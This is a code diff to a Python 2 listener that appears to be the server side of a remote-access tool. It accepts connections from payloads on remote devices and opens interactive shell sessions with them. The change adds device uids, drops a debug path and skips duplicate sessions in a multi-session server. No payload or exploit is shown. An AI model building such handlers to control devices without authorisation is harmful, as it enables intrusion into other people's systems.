@@ -459,6 +459,7 @@ def menuExit(): #4
 class SessionHandler:
     def __init__(self):
         self.name = ""
+        self.uid = ""
         self.conn = ""
         self.s = ""
         self.host = ""
@@ -478,19 +479,6 @@ class SessionHandler:
         s.listen(1)
         if verbose:
             print strinfo("Listening on port "+str(port)+"...")
-        
-        #debugging
-        if debug:
-            conn, addr = s.accept()
-            data = receiveString(conn)
-            if data: #payload should return the name of the device and we will use that as our prompt
-                name = UNDERLINE_GREEN + data.replace("\n","")+ENDC+GREEN+"> "+ENDC;
-                #spawn our interactive shell
-                self.name = name
-                self.conn = conn
-                CDA = "i386"
-                s.close()
-                return [name,conn,host,port,CDA]
         
         #SEND/RECEIVE ARCH
         conn, addr = s.accept()
@@ -549,6 +537,8 @@ class SessionHandler:
         data = receiveString(conn)
 
         if data: #payload should return the name of the device and we will use that as our prompt
+            self.uid = data.split(" ")[0]
+            data = data.replace(self.uid+" ","")
             name = UNDERLINE_GREEN + data.replace("\n","")+ENDC+GREEN+"> "+ENDC;
             #spawn our interactive shell
             self.name = name
@@ -564,8 +554,17 @@ def multiServer(host,port):
     strinfo("Starting Background Multi Server on "+str(port)+"...")
     print "type \"help\" for MultiServer commands"
     while 1:
-        sessions[x] = SessionHandler()
-        sessions[x].listen(0,host,port)
+        newsession = SessionHandler()
+        newsession.listen(0,host,port)
+        skip = 0
+        for sx in sessions:
+            if newsession.uid == sessions[sx].uid:
+                newsession.conn.close()
+                skip = 1
+                continue
+        if skip:
+            continue
+        sessions[x] = newsession
         sys.stdout.write("\n\r"+COLOR_INFO+"[*]  " + WHITE+"Session "+str(x)+" opened | "+sessions[x].name.replace(UNDERLINE_GREEN,"").replace(GREEN,"")[:-10] + " " + sessions[x].conn.getpeername()[0] +
                          WHITE+"\n"+COLOR_INFO+"MultiSession"+WHITE+"> ")
         sys.stdout.flush()
